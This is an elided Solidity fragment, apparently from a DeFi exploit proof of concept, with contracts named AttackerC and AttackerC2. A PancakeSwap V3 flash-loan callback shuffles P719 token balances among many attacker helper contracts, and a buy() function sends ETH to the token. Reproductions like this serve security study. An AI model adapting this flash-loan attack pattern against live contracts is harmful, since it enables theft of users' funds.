...
contract AttackerC {
    ...
    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        ...
        AttackerC2 attC3 = new AttackerC2();

        for (uint256 i; i < attackerC2s33.length; i++) {
            IERC20(P719).transferFrom(
                address(attackerC2s33[i]), address(attC3), IERC20(P719).balanceOf(address(attackerC2s33[i]))
            );
        }

        //IERC20(P719).approve(msg.sender, type(uint256).max);
        uint256 balAttC4 = IERC20(P719).balanceOf(address(attC3));

        for (uint256 i; i < attackerC2s100.length; i++) {
            IERC20(P719).transferFrom(address(attC3), address(attackerC2s100[i]), balAttC4 / 100);
...
contract AttackerC2 {
    ...
    function buy() external payable {
        (bool sucess,) = P719.call{value: msg.value}("");
